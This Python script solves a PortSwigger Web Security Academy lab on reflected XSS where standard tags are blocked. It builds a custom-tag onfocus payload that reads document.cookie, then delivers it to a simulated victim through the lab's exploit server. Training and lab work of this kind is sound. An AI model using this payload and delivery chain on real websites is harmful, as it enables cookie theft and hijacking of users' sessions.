#!/usr/bin/env python3
"""
Reflected XSS into HTML context with all tags blocked except custom ones
PortSwigger Web Security Academy — Cross-Site Scripting (XSS)

Companion script for the writeup: 15-reflected-xss-all-standard-tags-blocked.md

What this does:
    The filter blocks every standard HTML tag it recognizes, but its
    blocklist is a finite, hardcoded set of known tag names -- a made-up
    tag like <xss> isn't on it and passes straight through, attributes and
    events included, because browsers still parse unrecognized tags as
    valid custom elements. The payload gives the custom element an id and
    an onfocus handler, and the URL's #x fragment makes the browser jump to
    and focus that element as soon as the page loads, firing onfocus with
    no user interaction. autofocus-style focus doesn't reliably fire inside
    an <iframe>, so delivery has to be a full top-level navigation -- this
    script stores a small redirect page on the lab's exploit server that
    sets location to the payload URL, exactly as our own automated run did
    (and as PortSwigger's own published solution does too).

Usage:
    python 15-reflected-xss-all-standard-tags-blocked.py <lab-url>
    e.g. python 15-reflected-xss-all-standard-tags-blocked.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
    pip install playwright && playwright install chromium   # only used for the no-exploit-server fallback
"""

import re
import sys
import time
import urllib.parse
import httpx

# The #x fragment focuses id=x on load, firing its onfocus handler.
PAYLOAD = "<xss id=x onfocus=alert(document.cookie) tabindex=1>"
FRAGMENT = "#x"


def get_exploit_server_url(client: httpx.Client) -> str:
    r = client.get("/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else ""


def exploit_server_deliver(exploit_url: str, body: str) -> bool:
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    with httpx.Client(follow_redirects=True, timeout=20, verify=False) as c:
        form_data = {
            "urlIsHttps": "on",
            "responseFile": "/exploit",
            "responseHead": headers,
            "responseBody": body,
        }
        form_data["formAction"] = "STORE"
        r_store = c.post(exploit_url, data=form_data)
        if r_store.status_code >= 400:
            print(f"[!] Exploit server STORE failed: {r_store.status_code}")
            return False

        form_data["formAction"] = "DELIVER_TO_VICTIM"
        r_deliver = c.post(exploit_url, data=form_data)
        success = r_deliver.status_code < 400
        print(f"[{'+' if success else '!'}] DELIVER_TO_VICTIM {'sent' if success else 'failed'} (status {r_deliver.status_code})")
        return success


def solve(lab_url: str) -> None:
    client = httpx.Client(base_url=lab_url, follow_redirects=True, timeout=20)
    client.get("/")

    url = f"{lab_url}/?search={urllib.parse.quote(PAYLOAD)}{FRAGMENT}"
    print(f"[*] Payload: {PAYLOAD}{FRAGMENT}")
    print(f"[*] Target URL: {url}")

    exploit_url = get_exploit_server_url(client)
    if exploit_url:
        print(f"[*] Exploit server: {exploit_url}")
        redirect_body = f'<script>location="{url}";</script>'
        exploit_server_deliver(exploit_url, redirect_body)
        print("[*] Waiting for the simulated victim to load the exploit...")
        time.sleep(8)
    else:
        print("[*] No exploit server found -- falling back to a direct top-level navigation")
        try:
            from playwright.sync_api import sync_playwright
        except ImportError:
            print("[!] playwright not installed and no exploit server available -- cannot trigger")
            print("    pip install playwright && playwright install chromium")
            return

        session = client.cookies.get("session", "")
        domain = urllib.parse.urlparse(lab_url).netloc
        alert_fired = False
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            ctx = browser.new_context()
            if session:
                ctx.add_cookies([{"name": "session", "value": session, "domain": domain, "path": "/"}])
            page = ctx.new_page()

            def on_dialog(dialog):
                nonlocal alert_fired
                alert_fired = True
                dialog.accept()

            page.on("dialog", on_dialog)
            try:
                page.goto(url, wait_until="domcontentloaded", timeout=15000)
                page.wait_for_timeout(3000)
            except Exception:
                pass
            browser.close()
        print(f"[{'+' if alert_fired else '-'}] alert() {'fired' if alert_fired else 'did NOT fire'}")

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
